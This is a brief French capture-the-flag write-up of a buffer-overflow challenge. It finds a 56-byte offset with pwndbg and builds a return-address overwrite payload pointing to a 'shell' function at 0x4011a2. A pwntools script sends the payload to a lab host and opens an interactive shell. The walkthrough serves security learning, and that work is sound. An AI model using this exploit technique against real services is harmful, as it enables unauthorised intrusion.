# Depassement de tampon

A la vue du nom du challenge, on sait qu'on va avoir affaire à un buffer overflow

Après avoir dump le programme pwn :  objdump -d ./pwn
On voit la fonction shell à l'address :  0x4011a2 (00 00 00 00 00 40 11 a2)

Avec pwndbg: 

J'utilise la fonction cyclic pour avoir une entrée cyclique à fournir au programme pour déterminer l'offset. Grâce à cela, je sais que l'offset est à 56 bytes. 

Ainsi, je construis ce payload "A"*56+"\xa2\x11\x40\x00\x00\x00\x00\x00". 

```python
import pwn

HOST="172.25.106.194"

def exploit():
    conn = pwn.remote(HOST,4000)
    while conn.can_recv(timeout=1):
        conn.sendlineafter("=","A"*56+"\xa2\x11\x40\x00\x00\x00\x00\x00")
        conn.interactive()

if __name__ == "__main__":
    exploit()

```